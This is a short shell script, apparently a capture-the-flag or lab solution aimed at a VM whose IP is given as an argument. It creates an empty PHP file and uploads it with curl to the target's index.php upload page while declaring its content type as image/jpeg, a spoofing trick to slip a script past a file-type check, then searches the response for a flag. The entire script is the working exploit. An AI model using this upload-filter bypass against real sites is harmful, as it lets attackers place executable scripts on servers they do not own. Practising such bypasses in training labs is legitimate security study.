#!/bin/sh

if [ -f $1 ]; then
	echo "specify the ip of the VM"
	echo "./`basename $0` <ip>"
else
	touch /tmp/test.php
	curl -s -X POST -F "uploaded=@/tmp/test.php;type=image/jpeg" -F "Upload=Upload" "http://$1/index.php?page=upload" | grep 'flag'
fi	

